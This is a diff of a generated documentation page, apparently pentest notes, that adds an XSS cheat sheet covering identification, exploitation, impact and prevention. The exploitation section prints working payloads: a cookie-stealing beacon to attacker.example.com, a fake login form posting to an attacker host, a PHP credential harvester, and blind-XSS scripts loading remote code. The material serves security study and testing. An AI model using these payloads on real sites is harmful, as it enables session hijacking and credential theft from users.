@@ -19,7 +19,7 @@
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
@@ -469,6 +469,34 @@
   
   
     <li class="md-nav__item">
+      <a href="../broken-authentication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Broken Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../broken-access-control/" class="md-nav__link">
         
   
@@ -682,6 +710,45 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Payloads
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phishing-with-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phishing with XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -845,34 +912,6 @@
   
   
     <li class="md-nav__item">
-      <a href="../authentication/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Authentication
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
       <a href="../business-logic-vulnerabilities/" class="md-nav__link">
         
   
@@ -937,6 +976,62 @@
     
   
     Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../file-inclusion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../file-upload-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload Attacks
   
 
     
@@ -1339,6 +1434,45 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Payloads
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phishing-with-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phishing with XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -1393,12 +1527,115 @@
 
 <h1 id="xss">XSS</h1>
 <h2 id="overview">Overview</h2>
+<p>Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users. The victim's browser executes the attacker-controlled code in the context of the vulnerable site, enabling cookie theft, session hijacking, phishing, defacement, or actions on behalf of the victim.</p>
+<p>There are three primary types:
+- <strong>Stored (Persistent) XSS</strong>: Malicious input is saved on the server and served to users later.
+- <strong>Reflected (Non-Persistent) XSS</strong>: Input is immediately reflected in the response (often via URL parameters or forms).
+- <strong>DOM-based XSS</strong>: The vulnerability exists in client-side JavaScript that processes input unsafely.</p>
 <h2 id="attack-surface">Attack Surface</h2>
+<ul>
+<li>Any input field that is later displayed to users (comments, profiles, search results, error messages).</li>
+<li>URL parameters, headers (User-Agent, Cookie, Referer) when their values are rendered.</li>
+<li>Rich text editors and content management systems.</li>
+<li>API responses consumed by frontend JavaScript.</li>
+<li>File uploads whose content or metadata is rendered.</li>
+</ul>
 <h2 id="identification">Identification</h2>
+<ul>
+<li>Submit a basic test payload and look for execution: <code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></li>
+<li>Test in all input points, including non-obvious ones (headers, file metadata).</li>
+<li>Use automated scanners (Burp, ZAP, XSStrike) for initial discovery.</li>
+<li>Look for reflected or stored input without proper output encoding.</li>
+<li>Test context-specific payloads (HTML, JavaScript, attribute contexts).</li>
+</ul>
 <h2 id="exploitation">Exploitation</h2>
+<h3 id="basic-payloads">Basic Payloads</h3>
+<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">origin</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-0-2"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-0-3"><span class="o">&lt;</span><span class="nx">img</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">origin</span><span class="p">)</span><span class="o">&gt;</span>
+</span><span id="__span-0-4"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">background</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;#141d2b&quot;</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-0-5"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="ow">new</span><span class="w"> </span><span class="nx">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://attacker.example.com/?c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Additional useful payloads:
+- <code>&lt;plaintext&gt;</code> — stops further HTML rendering.
+- <code>&lt;script&gt;print()&lt;/script&gt;</code> — trigger print dialog.
+- <code>&lt;script src="http://attacker/script.js"&gt;&lt;/script&gt;</code> — load external script.
+- DOM manipulation: remove elements, change title, overwrite body.</p>
+<p><strong>Context matters:</strong> Payloads must be adapted to where the input is rendered (inside tags, attributes, JavaScript strings, etc.).</p>
+<h3 id="phishing-with-xss">Phishing with XSS</h3>
+<p>Inject a fake login form that sends credentials to the attacker:</p>
+<div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://attacker-ip&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">);</span>
+</span><span id="__span-1-2"><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;originalFormId&#39;</span><span class="p">).</span><span class="nx">remove</span><span class="p">();</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Combine with HTML comments <code>&lt;!--</code> to clean up remaining legitimate content.</p>
+<p>Send the encoded payload to the victim via a link or stored content.</p>
+<p><strong>Simple credential harvester (PHP example):</strong>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span>
+<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-2-2"><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span id="__span-2-3">    <span class="nv">$file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;creds.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;a+&quot;</span><span class="p">);</span>
+</span><span id="__span-2-4">    <span class="nb">fputs</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&quot;Username: </span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> | Password: </span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+</span><span id="__span-2-5">    <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: http://original-site/&quot;</span><span class="p">);</span>
+</span><span id="__span-2-6">    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span><span id="__span-2-7">    <span class="k">exit</span><span class="p">();</span>
+</span><span id="__span-2-8"><span class="p">}</span>
+</span><span id="__span-2-9"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div></p>
+<h3 id="blind-xss">Blind XSS</h3>
+<p>Useful for forms only accessible to privileged users (contact forms, support tickets, admin reviews, User-Agent logging).</p>
+<p>Inject a script tag that beacons to your server:
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://attacker-ip/script.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></p>
+<p>Use unique paths per field to identify the vulnerable input:
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">http://attacker-ip/fullname</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></p>
+<p>Advanced detection payloads:
+- <code>&lt;script src=http://attacker-ip&gt;&lt;/script&gt;</code>
+- <code>javascript:eval('var a=...')</code>
+- <code>$.getScript("http://attacker-ip")</code></p>
 <h2 id="impact">Impact</h2>
+<ul>
+<li>Session hijacking via cookie theft</li>
+<li>Phishing and credential theft</li>
+<li>Actions performed with the victim's privileges (e.g., changing settings, making purchases)</li>
+<li>Keylogging or screen scraping</li>
+<li>Defacement or malware delivery</li>
+<li>Bypassing CSRF protections in some cases when combined with other attacks</li>
+</ul>
 <h2 id="prevention">Prevention</h2>
+<ul>
+<li>Encode/escape all user-controlled output according to context (HTML, JavaScript, CSS, URLs, attributes).</li>
+<li>Use modern frameworks that provide automatic escaping (React, Angular, etc.).</li>
+<li>Implement a strong Content-Security-Policy (CSP) as defense in depth.</li>
+<li>Sanitize rich HTML input with well-maintained libraries (e.g., DOMPurify).</li>
+<li>Avoid inserting user input into dangerous contexts (innerHTML without sanitization, <code>eval()</code>, etc.).</li>
+<li>Validate and encode on both client and server.</li>
+</ul>
 <h2 id="tools-payloads">Tools &amp; Payloads</h2>
+<ul>
+<li><strong>Manual testing:</strong> Burp Repeater, browser dev tools</li>
+<li><strong>Automated:</strong> XSStrike, XSSer, Burp Pro scanner, ZAP</li>
+<li><strong>Payload collections:</strong></li>
+<li>PayloadsAllTheThings XSS section</li>
+<li>PayloadBox XSS lists</li>
+<li><strong>Example basic test:</strong>
+  <div class="language-js highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">origin</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<p><strong>Note:</strong> XSS can appear in HTTP headers (User-Agent, Cookie) when those values are reflected on the page. Test comprehensively.</p>
+<p>See the <a href="../csrf/">CSRF</a> notes for chaining techniques (e.g., XSS + CSRF).</p>
 
 
 
